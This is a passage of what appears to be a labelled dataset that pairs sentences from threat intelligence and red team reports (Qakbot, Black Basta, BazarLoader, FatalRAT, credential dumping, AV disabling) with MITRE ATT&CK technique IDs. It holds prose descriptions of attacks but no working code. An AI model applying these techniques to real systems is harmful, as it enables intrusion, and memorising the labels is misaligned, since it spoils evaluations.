    "text": "Attacker Technique - Auto Logon Count Set OnceAttacker Technique - Potential Process Hollowing To DLLHostAttacker Technique - Shutdown With Message Used By Malicious ActorsAttacker Technique - URL Passed To BitsAdminLateral Movement - Enable RDP via reg.exeSuspicious Process - BCDEdit Enabling SafebootSuspicious Process - Boot Configuration Data Editor ActivitySuspicious Process - DLLHost With No Arguments Spawns ProcessSuspicious Process - Rundll32.exe With No Arguments Spawns ProcessSuspicious Process - ShadowCopy Delete Passed To WMICSuspicious Process - Volume Shadow Service Delete Shadow CopiesIOC's TypeValueRegistry KeyHKLM\\System\\CurrentControlSet\\Control\\Terminal ServerRegistry ValueType: DWORD Name: fDenyTSConnections",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "As of this writing, the most recent piece of malware that uses this technique is the JavaScript- or Windows Scripting File-packed Magniber ransomware.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Response when accessing the C&C via web browsers (top), and modifying the user-agent to access the C&C and return encoded data (bottom) ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "It still downloads a PowerShell code (the main ViperSoftX script) to crawl through different paths in the system for cryptocurrency wallets.",
    "command": "",
    "labels": [
      "T1083",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "ViperSoftX scans for these cryptocurrency wallets in local directories: Armory Atomic Wallet Binance Bitcoin Blockstream Green Coinomi Delta Electrum Exodus Guarda Jaxx Liberty Ledger Live Trezor Bridge ",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "From that host, the team moved laterally to a misconfigured server, from which they compromised the domain controller (DC).",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "They then used forged credentials to move to multiple hosts across different sites in the environment and eventually gained root access to all workstations connected to the organization’s mobile device management (MDM) server.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The team used this root access to move laterally to SBS-connected workstations.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The meeting invite took them to a red team-controlled domain [T1566.002] with a button, which, when clicked, downloaded a “malicious” ISO file [T1204].",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "After the download, another button appeared, which, when clicked, executed the file. ",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "On Workstation 1, the team leveraged a modified SharpHound collector, ldapsearch, and command-line tool, dsquery, to query and scrape AD information, including AD users",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "To obtain the credentials, the team took a snapshot of lsass.exe",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "[T1003.001] with a tool called nanodump, exported the output, and processed the output offline with Mimikatz. ",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "[T1049] on SCCM Server 1, which revealed an active Server Message Block (SMB) connection from SCCM Server 2. Attempted to move laterally to the SCCM Server 2 via AppDomain hijacking, but the HTTPS beacon failed to call back. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "In some instances, they used Windows Management Instrumentation (WMI)",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Event Subscriptions",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "In other cases, the team attempted to determine valid accounts based on group name and purpose.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The team attempted to leverage these credentials to browse to the web login page of the MDM vendor but were unable to do so because the website directed to an organization-controlled single-sign on (SSO) authentication page. ",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "While in the MDM MySQL database, Elevating the selected MDM user’s account privileges to administrator privileges, and Modifying the user’s account by adding Create Policy and Delete Policy permissions [T1098], [T1548]. Creating a policy via the MDM API [T1106], which instructed Workstation 4 to download and execute a payload to give the team interactive access as root to the workstation. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Note: Merlin is a post-exploit tool that leverages HTTP protocols for C2 traffic. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The redirectors used HTTPS reverse proxies to redirect C2 traffic between the target organization’s network and the Cobalt Strike team servers",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "[T1048] Network Monitoring and Analysis Tools Intrusion Detection or Prevention Systems Endpoint Protection Platform Detect target hosts and ports Identify associated scanning process Analyze scanning host once detected Develop response plan None Malicious Traffic Generation—Workstation to External Host Establish a session that originates from a target Workstation system directly to an external host over a clear text protocol, such as HTTP. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "[T1071] Intrusion Detection or Prevention Systems Endpoint Protection Platform Windows Event Logs Detect and Identify source IP and source process of enumeration Analyze scanning host once detected Develop response plan None Active Directory Account Lockout Lock out several administrative AD accounts Account Access Removal",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "[T1531] Windows Event Logs End User Reporting Detect and Identify source IP and source process of exfiltration Analyze host used for exfiltration once detected Develop response plan None Local Admin User Account Creation (workstation) Create a local administrator account on a target workstation system. ",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Create Account: Local Account [T1136.001] Account Manipulation [T1098] Intrusion Detection or Prevention Systems Endpoint Protection Platform Web Proxy Logs Detect and identify source IP and source process of malicious traffic Investigate destination IP address Triage compromised host Develop response plan None Local Admin User Account Creation (server) Create a local administrator account on a target server system. ",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Develop response plan None Workstation Admin Lateral Movement—Workstation to Workstation Use a previously compromised workstation admin account to upload and execute a payload via SMB and Windows Service Creation, respectively, on several target Workstations. ",
    "command": "",
    "labels": [
      "T1078",
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Windows Service [T1543.003] Windows Event Logs Detect account compromise Analyze compromised host Develop response plan None Domain Admin Lateral Movement—Workstation to Domain Controller Use a previously compromised domain admin account to upload and execute a payload via SMB and Windows Service Creation, respectively, on a target DC. ",
    "command": "",
    "labels": [
      "T1078",
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Windows Service [T1543.003] Windows Event Logs Detect account compromise Triage compromised host Develop response plan None Malicious Traffic Generation—Domain Controller to External Host Establish a session that originates from a target Domain Controller system directly to an external host over a clear text protocol, such as HTTP. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "[T1071] Intrusion Detection or Prevention Systems Endpoint Protection Platform Web Proxy Logs Detect and identify source IP and source process of malicious traffic Investigate destination IP address Triage compromised host Develop response plan None Trigger Host-Based Protection—Domain Controller Upload and execute a well-known malicious file to a target DC system to generate host-based alerts. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Ingress Tool Transfer [T1105] Endpoint Protection Platform Endpoint Detection and Response Detect and identify source IP and source process of malicious traffic Investigate destination IP address Triage compromised host Develop response plan Malicious file was removed by antivirus Ransomware Simulation Execute simulated ransomware on multiple Workstation systems to simulate a ransomware attack. ",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "The krbtgt account is a domain default account that acts as a service account for the key distribution center (KDC) service used to encrypt and sign all Kerberos tickets for the domain.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The team discovered several standard user accounts that have local administrator access to critical servers.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "This misconfiguration allowed the team to use the low-level access of a phished user to move laterally to an Unconstrained Delegation host and compromise the entire domain. ",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The team performed an NTLM-relay attack to obtain the DC’s TGT, followed by a golden ticket attack on a SharePoint server with Unconstrained Delegation to gain the ability to impersonate any Site 1 AD account. Use of non-secure default configurations.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The organization used default configurations for hosts with Windows Server 2012 R2.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The default configuration allows unprivileged users to query group membership of local administrator groups.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The red team used and identified several standard user accounts with administrative access from a Windows Server 2012 R2 SharePoint server. ",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Some workstations allowed unprivileged accounts to have local administrator access; for example, the red team discovered an ordinary user account in the local admin group for the SharePoint server.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "If a user with administrative access is compromised, an actor can access servers without needing to elevate privileges.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "User Execution T1204 Users downloaded and executed the team’s initial access payloads after clicking buttons to trigger download and execution. ",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Windows Service T1543.003 During Phase II, the team leveraged compromised workstation and domain admin accounts to execute a payload via Windows Service Creation on target workstations and the DC. ",
    "command": "",
    "labels": [
      "T1078",
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Event Triggered Execution: Windows Management Instrumentation Event Subscription T1546.003 ",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "The team used WMI Event Subscriptions to move laterally between sites. ",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": ", the team compromised a domain admin account and used it to laterally to multiple workstations and the DC. ",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Credential Access Technique Title ID Use OS Credential Dumping: LSASS Memory T1003.001 ",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "The team obtained the cached credentials from a SharePoint server account by taking a snapshot of lsass.exe with a tool called nanodump, exporting the output and processing the output offline with Mimikatz. ",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "During Phase II, they used compromised workstation and domain admin accounts to upload a payload via SMB on several target Workstations and the DC. ",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Application Layer Protocol: Web Protocols T1071.001 ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The team’s C2 redirectors used HTTPS reverse proxies to redirect C2 traffic. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "File Transfer Protocols T1071.002 ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The team used HTTPS reverse proxies to redirect C2 traffic between target network and the team’s Cobalt Strike servers. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "During Phase II, the team uploaded and executed well-known malicious files to the DC to generate host-based alerts. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "From MVISION Insights preview, you can see that NetWalker leverages tactics and techniques common to other ransomware attacks, such as spear phishing attachments for Initial Access, use of PowerShell for deployment, modification of Registry Keys/Startup folder for persistence and encryption of files for impact of course. ",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "CSC 7 – Email and Web Browser Protection CSC 8 – Malware Defenses Endpoint Security Platform 10.7, Threat Prevention, Adaptive Threat Protection, Web Gateway (MWG), Advanced Threat Defense, Web Gateway Cloud Service (WGCS) Initial Access Valid Accounts (T1078) RDP Compromised CSC 5 Secure Configuration of hardware and software CSC 9 Limitation of Network Ports and Protocols CSC 12 Boundary Defense Endpoint Security Platform 10.7, Threat Prevention ",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "For more information on how McAfee can protect against suspicious email attachments, review this additional blog post. Using valid accounts and protocols, such as for Remote Desktop Protocol, is an attack technique we have seen rise during the initial COVID-19 period.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Proactively Detecting NetWalker Techniques Many of the exploit stage techniques in this attack use legitimate Windows tools or valid accounts to either exploit, avoid detection or move laterally.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "As security analysts, we want to focus on suspicious techniques, such as PowerShell, used to download files… or execute scripts… or evade defenses… Monitoring or Reporting on NetWalker Events Events from McAfee Endpoint Protection and Web Gateway play a key role in NetWalker incident and threat response.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "One may assume that traffic over 2222 would be SSH traffic, however further analysis of the traffic generated by the Qakbot Sample in the lab shows that this connection was likely HTTPS in nature. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The second stage payload, which was later determined to likely be the penetration testing framework \"Brute Ratel,\" was then downloaded via a connection to an IP from Russia. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "These domains had shared trust and were connected via VPN tunnels which allowed the threat actor to move freely between domains. ",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "However, after reaching the local DC, the attacker was able to gain a better lay of the land and observe the presence of the other two domains. ",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Although no sample was able to be provided for the Client.exe (which is believed to be the ESXi variant), Quadrant was able to obtain a copy of \"Client_s.exe\" for Windows hosts. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Two \".bat\" files were sent throughout the organization.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Both were designed to turn off antivirus and anti-malware software.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Suricata logs show that “RClone” was downloaded on the file servers in order to facilitate exfiltration of the logs.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This legitimate program was abused by the attacker to steal client data. ",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "While examining this data, the I.R. team member became aware of the use of RDP by the Threat Actor by observing RDPClip.exe logging that looked, by definition, incredibly suspicious. ",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "In both cases the JavaScript files set several variables before running the \".cmd\" file contained within the ISO.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Ultimately, this CMD file calls the \"db\" file.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "In both samples, the \"db\" file is not a database, but is the actual Qakbot trojan. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Following detonation of Qakbot, the malware copied itself to \"$CURRENTUSER\\AppData\\Roaming\\Microsoft\\Isoaahffo\\djkuuhd.dll,\" as confirmed by the file's hashes shown below, and sets itself to auto run.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "During the initial detonation of 5898, the process imbedded itself into wermgr.exe, the Windows Error Reporting Manager (Process ID 6660). ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Further analysis of the registry keys added by the sample were able to be decrypted by leveraging the decryption script found at the link \"https://github.com/drole/qakbot-registry-decrypt\".",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Evidence suggests that the sample does not communicate over SSH and the communication is consistent with HTTP/S traffic. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "An overview of the lab setup and tools can be found in INDEX B. While continuing to run the SSH client on the emulated C2 device, the malware was detonated on the VM, we can see that the same packet following the 3-way handshake no longer contains SSH information but is detected as a Client Hello. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The emulated C2 Server is now running an HTTPS server on TCP port 2222.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "A dynamic analysis of \"Tox5\" shows the malware drops itself in a randomly generated name folder under the \"ProgramData\" directory and adds itself to a scheduled task. ",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Task manager was then use to reveal the service running on PID 3488, which was renamed instance of Tox5. ",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Logging shows actions taken by the attacker that were recorded by RDPClip in the form of clipboard logging, indicating the use of Remote Desktop Protocol.[CI1] ",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Files commonly observed transferred via SMB include: Black Basta Ransomware \"Client_s.exe\" and \"Client.exe\" Cobalt Strike beacon with the name of \"Ticket-5731.xls\" \".bat\" files designed to disable Cisco AMP / Microsoft Defender Clipboard logging",
    "command": "",
    "labels": [
      "T1059.003",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Showing the Transfer of Cobalt Strike Beacons using RDPClip: The first part of the command is below, with the payload redacted for size and ease of readability.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "This occurred immediately following the clipboard transfer of the command \"net stop Cisco AMP\". ",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "A search of Active Directory for users whose passwords never expire, and the last set date while writing to a file for later exfiltration: Stopping Cisco AMP / Disabling Microsoft Defender, these are the same commands as observed in the \".bat\" files: Transfer and use of Ticket-5731.xls",
    "command": "",
    "labels": [
      "T1059.003",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Although cob_12.dll was not collected for technical sample, tox5.exe was reviewed: Clipboard logging showing the “uninstall” commands for Windows Defender: Adding an Admin to ESXi environment: Domain Controller detection: Connection attempt to a \"SH/WEB\" domain: ",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Command showing the use of \"Bitsadmin\" to transfer the Black Basta Ransomware: Connection from Client by threat actor: DISABLING ANTIVIRUS/MALWARE SOFTWARE USING \".BAT\"",
    "command": "",
    "labels": [
      "T1059.003",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "FILES ",
    "command": "",
    "labels": [
      "T1059.003",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The two \".bat\" files that were sent throughout the organization were both designed to turn off Antivirus and Antimalware software.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "This could indicate that it was written hastefully in order to get it onto the target environment. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "\"cc.bat\" is a simple script designed to stop Cisco AMP. ",
    "command": "",
    "labels": [
      "T1059.003",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "For this example, the text editor \"vim” was used to open the file: \"w.bat\" as viewed through the bash command \"cat\": ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "From a static malware analysis review, very little was initially able to be obtained from the sample aside from the \".basta\" suffix and a relation to \"Fax.\" Static analysis conducted inside of x32dbg, showing a relation to \"FAX\" and the potential use of the directory \"ProgramData\": Upon detonation, running the malware sets itself up as the service \"Fax\" and enables it to start during safe boot.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "The same device also carried out another collection in December 2022, where data was copied from folder <C\\:$RECYCLE.BIN\\S-XXXXX$XXXH.pdf>, indicating that the user deleted the collected data. ",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "The group has been observed utilizing Avast’s WSC DLL for sideloading, a technique leveraging the Windows Management Instrumentation (WMI) service to execute malicious code.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Drop and execute the legitimate installer in C:\\Program Files\\Common Files (see CommonFiles64Folder). ",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Create scheduled tasks to execute the loader and updater components. ",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The original libpng13.dll is also included in the installer package (renamed to what appears to be a random name) because the malicious DLL forwards its exported functions to the original DLL.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The malicious DLL is very simple and executes OSSUTIL (included in the installer package as ssu.exe) to download files from an attacker-controlled bucket in Alibaba Cloud.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The attackers made the same mistake with the scheduled tasks created for the updater, as the execution path also refers to a subdirectory 2 that doesn’t exist.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "In most cases, four scheduled tasks are created: two for the RAT (one set to execute periodically and the other whenever any user logs into the PC) and two for the updater.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Before the execution of this export function, the shellcode reconstructs the imports table of the DLL and calls the DllEntryPoint, which simply invokes the Windows API function DisableThreadLibraryCalls as a way to increase the stealthiness of the DLL. SignalChromeElf essentially will decrypt, load, and execute an encrypted payload located in the embedded DLL.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Once decrypted, the content of the three files is concatenated, forming shellcode that contacts a C&C server to download and execute further shellcode. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Execution: Malicious FileThe attackers have relied on their victims to execute the malicious MSI installers. ",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Windows Command ShellThe malware updater uses cmd.exe to download files from Alibaba Cloud Object Storage Service. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "APIThe loaders use API calls such as VirtualAlloc to load and execute malicious components into memory. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "PersistenceT1053.005Scheduled Task/Job: Scheduled TaskThe MSI installers create scheduled tasks to achieve persistence. ",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "T1547.001Boot or Logon Autostart Execution: Registry Run Keys / Startup FolderFatalRAT creates a registry Run key to achieve persistence. ",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Adobe Reader or a photo viewing program can’t open the file. ",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The target would then, naturally, double click the other file in the Zip archive — a Windows Shortcut (.LNK file) labeled with a PDF file suffix and with an icon that makes it appear to be a PDF document. ",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "C:\\Windows\\Tasks\\[eight letters].vbs The shortcut command pulls down a Visual Basic script, drops it into the C:\\Windows\\Tasks folder, and executes it.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "These work in tandem to insert data into the Windows Registry and execute PowerShell commands. ",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Assembly to load the final payload into memory from a Registry value without writing it to disk.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "The concatenated segments of base64 data from O7 get inserted into the Registry, for the Ir8 script to decode. ",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "On one machine, we found that the malware injected itself, using process hollowing, into ielowutil.exe, used by the now defunct Internet Explorer browser for tuning the microphone settings in the browser.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "It creates a User-level Environment Variable (in our test case, this was called SaltoQ), which points at the full path to the PowerShell executable on the system. ",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "It created a Run key in the Registry named Overproduce that invokes the SaltoQ variable to run a PowerShell command at every reboot. ",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "And that Run key references a different Registry key, in HKEY_CURRENT_USER\\Cloglike that contains a portion of the same Visual Basic Script code that was in the original .vbs payload the malware downloads during the infection process. ",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Instead, it will call advapi32.CryptHashData using the string s_)q03vcOm95^+Rj3dG_Jx@k0GGwYOIddH_14025b520 as the data to create a hash using the PROV_RSA_FULL Windows cryptographic provider.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Once the hash is created, it will create a key using advapi32.CryptDeriveKey. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "It will then obtain a handle to the current process for the purpose of allocating memory with PAGE_EXECUTE_READWRITE permissions. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Once the encrypted shellcode has been copied to executable memory, it will then use advapi32.CryptEncrypt to decrypt the shellcode.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The shellcode will obtain a handle to kernel32.LoadLibraryA, kernel32.GetProcAddress, kernel32.VirtualAlloc, kernel32.VirtualProtect and ntdll.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "ZwFlushInstructionCache, by enumerating the Process Environment Block (PEB) using the instruction mov rax,qword ptr gs: [60]. ",
    "command": "",
    "labels": [
      "T1057",
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Once completed, it will then call kernel32.VirtualALloc to prepare injecting a PE executable for the next stage.",
    "command": "",
    "labels": [
      "T1055",
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "When the additional APIs have been resolved, it will then make the .text section it copied earlier executable using kernel32.VirtualProtect, as seen in Figure 9. Figure 9: Make .text Section Executable NOTE:",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "This can be seen in Figure 10. Figure 10: OEP Shellcode/PE Trickery After the previous trickery in the new memory space, it will start creating another PE in memory, but this time the header does start with the MZ magic value.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "After building the headers, it will copy each PE section one at a time, as seen in Figure 11. Figure 11:",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "To avoid running more than one instance of itself, BazarLoader will create a mutex with a hard-coded UUID, then use kernel32.GetLastError to check for the error ERROR_ALREADY_EXISTS.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The call to kernel32.CreateMutexA can be seen in Figure 13. Figure 13: Mutex Creation Interestingly, BazarLoader will check for mutexes twice. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Once BazarLoader has determined the Armenian language is not being used and another instance of itself is not running, it will make a HTTP HEAD request to hxxps://titlecs[.]com.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The first request will be sent using wininet.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "HttpSendRequestA, as seen in Figure 15. Figure 15: HTTP HEAD Request ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "BazarLoader will also check if it is connected to the internet by making a request to microsoft[.]com, as seen in Figure 17. Figure 17: BazarLoader Internet Connectivity Check Once completed, it will make a POST request to the second domain in its configuration, as seen in Figure 18. Figure 18: BazarLoader C2 Checkin Once completed, it will make a HTTP GET request in order to obtain the next stage, as seen in Figure 19. Figure 19:",
    "command": "",
    "labels": [
      "T1071.001",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "We suspect the reason behind the malware developer(s) success is their use of techniques such as avoiding the use of threading APIs and faking PE injection, when in reality, it is simply shellcode injection.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The attackers used NBTScan for network reconnaissance and PsExec for lateral movement.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "They obtained credentials for pivoting with Mimikatz.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "In some cases, we were able to detect memory dumps of the lsass process that had been archived and uploaded.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "On the hosts of presumably greatest interest, the SysUpdate and HyperBro backdoors were installed for reliable persistence and access. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "By using the tools already described, the attackers obtained the credentials of a domain administration at headquarters.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "For the finale, on April 29, 2020, the account of the compromised domain admin was used to push Polar ransomware to computers and run it, encrypting user files and demanding a ransom.",
    "command": "",
    "labels": [
      "T1078",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Three files are sent to the victim's computer: ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The payload and intermediate library are deleted before completion.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
